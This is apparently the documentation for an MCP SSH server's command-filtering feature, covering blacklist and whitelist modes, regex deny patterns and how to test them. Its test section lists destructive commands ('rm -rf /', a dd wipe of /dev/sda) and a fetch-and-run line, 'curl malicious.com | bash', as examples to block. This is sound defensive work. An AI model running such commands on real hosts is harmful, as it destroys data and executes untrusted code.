# MCP SSH Security Configuration

This document describes the security features and configuration options for the MCP SSH server.

## Overview

The MCP SSH server includes a comprehensive command validation system that can restrict dangerous commands using configurable blacklist or whitelist patterns. This helps prevent accidental or malicious execution of harmful commands on remote systems.

## Security Modes

### 1. Blacklist Mode (Default)
- **Mode**: `blacklist`
- **Behavior**: Blocks commands matching blacklist patterns, allows everything else
- **Use Case**: General purpose with protection against known dangerous commands
- **Default**: Includes comprehensive patterns for system-destructive commands

### 2. Whitelist Mode
- **Mode**: `whitelist`
- **Behavior**: Only allows commands matching whitelist patterns, blocks everything else
- **Use Case**: High-security environments where only specific commands should be allowed
- **Default**: No patterns (blocks everything unless configured)

### 3. Disabled Mode
- **Mode**: `disabled`
- **Behavior**: No command filtering (⚠️ **DANGEROUS** - use only for testing)
- **Use Case**: Testing or development environments where security is not a concern

## Environment Variables

| Variable | Description | Default | Example |
|----------|-------------|---------|---------|
| `MCP_SSH_SECURITY_MODE` | Security mode | `blacklist` | `whitelist` |
| `MCP_SSH_COMMAND_BLACKLIST` | Semicolon-separated regex patterns for blocked commands | Built-in patterns | `rm.*-rf.*;sudo.*` |
| `MCP_SSH_COMMAND_WHITELIST` | Semicolon-separated regex patterns for allowed commands | Empty | `ls.*;cat.*;ps.*` |
| `MCP_SSH_CASE_SENSITIVE` | Whether pattern matching is case sensitive | `false` | `true` |

## Configuration Examples

### Basic Blacklist Configuration
```bash
export MCP_SSH_SECURITY_MODE=blacklist
export MCP_SSH_COMMAND_BLACKLIST="rm\s+.*-r.*;dd\s+.*;sudo\s+.*;shutdown.*"
```

### Development Environment Whitelist
```bash
export MCP_SSH_SECURITY_MODE=whitelist
export MCP_SSH_COMMAND_WHITELIST="git.*;npm.*;node.*;ls.*;cat.*;grep.*;find.*"
```

### Production Environment Strict Blacklist
```bash
export MCP_SSH_SECURITY_MODE=blacklist
export MCP_SSH_COMMAND_BLACKLIST="rm\s+.*-[rf].*;dd\s+.*;mkfs\s+.*;sudo\s+.*;systemctl\s+(stop|disable).*;shutdown.*;reboot.*;.*>\s*/dev/.*;curl\s+.*\|\s*bash"
```

## Default Blacklist Patterns

The following dangerous command patterns are blocked by default in blacklist mode:

- **File Operations**: `rm -rf`, `rm -f` (recursive/force deletions)
- **Disk Operations**: `dd`, `mkfs`, `fdisk`, `parted` (disk formatting/partitioning)
- **Privilege Escalation**: `sudo`, `su`, `passwd` (privilege changes)
- **Network Security**: `iptables`, `ufw` (firewall modifications)
- **System Control**: `systemctl stop/disable`, `service stop`, `shutdown`, `reboot`, `halt`
- **Process Control**: `killall`, `pkill` (mass process termination)
- **File System**: `mount`, `umount` (file system mounting)
- **Dangerous Permissions**: `chmod 777`, `chown root` (security-compromising permissions)
- **Device Access**: Writing to `/dev/sd*`, `/dev/nvme*` (direct device access)
- **Remote Execution**: `curl|bash`, `wget|sh` (download and execute)
- **System Maintenance**: `crontab -r`, `history -c` (system configuration removal)

## Regex Pattern Examples

### Common Dangerous Patterns
```regex
# Block recursive deletions
rm\s+.*-r.*

# Block disk operations
dd\s+if=/dev.*

# Block privilege escalation
sudo\s+.*

# Block system service stops
systemctl\s+(stop|disable|mask).*

# Block piping to shell execution
.*\|\s*(sh|bash)\s*$

# Block download and execute
(curl|wget)\s+.*\|\s*(sh|bash)
```

### Safe Command Patterns (for whitelists)
```regex
# Read-only file operations
(ls|cat|head|tail|grep|find)\s+.*

# System monitoring
(ps|top|htop|df|free|netstat|ss)\s+.*

# Git operations
git\s+(status|log|diff|show|branch|pull|push).*

# Development tools
(npm|node|python|pip)\s+.*
```

## MCP Tools

The server provides an additional tool for security management:

### `get_security_info`
Returns current security configuration including:
- Security mode
- Case sensitivity setting
- Number of patterns loaded
- All configured patterns

## Testing Your Configuration

1. **Start the server** with your security configuration
2. **Check configuration** using the `get_security_info` tool
3. **Test safe commands** that should be allowed
4. **Test dangerous commands** that should be blocked
5. **Review logs** for security validation messages

### Example Test Commands

**Safe commands** (should be allowed in default blacklist mode):
```bash
ls -la
ps aux
df -h
cat /etc/hostname
whoami
```

**Dangerous commands** (should be blocked in default blacklist mode):
```bash
rm -rf /
sudo shutdown now
dd if=/dev/zero of=/dev/sda
systemctl stop nginx
curl malicious.com | bash
```

## Security Best Practices

1. **Use Whitelist Mode** for high-security environments
2. **Test Thoroughly** before deploying to production
3. **Monitor Logs** for blocked command attempts
4. **Regular Updates** to patterns based on new threats
5. **Environment-Specific** configurations (dev vs prod)
6. **Principle of Least Privilege** - only allow necessary commands

## Logging and Monitoring

Security events are logged with the following information:
- Command validation attempts
- Blocked commands with reasons
- Pattern matches
- Host and user context (when available)

Log files are located in the `logs/` directory:
- `logs/ssh.log` - Main application log including security events

## Troubleshooting

### Common Issues

1. **All commands blocked in whitelist mode**
   - Check that `MCP_SSH_COMMAND_WHITELIST` is properly configured
   - Verify regex patterns are valid

2. **Expected dangerous commands not blocked**
   - Verify `MCP_SSH_SECURITY_MODE=blacklist`
   - Check pattern syntax and escaping

3. **Regex pattern errors**
   - Test patterns using online regex validators
   - Check for proper escaping of special characters

### Debug Mode

Enable debug logging to see detailed pattern matching:
```bash
export PYTHONPATH=/path/to/mcp_ssh/src
python -c "
import logging
logging.basicConfig(level=logging.DEBUG)
from mcp_ssh.security import validate_command
print(validate_command('your_test_command'))
"
```

## Contributing

When adding new security patterns:
1. Test thoroughly with various command variations
2. Consider false positives (legitimate commands being blocked)
3. Document the threat being mitigated
4. Add test cases to `tests/test_security.py`

For more examples and advanced configurations, see `examples/security_config.env`.
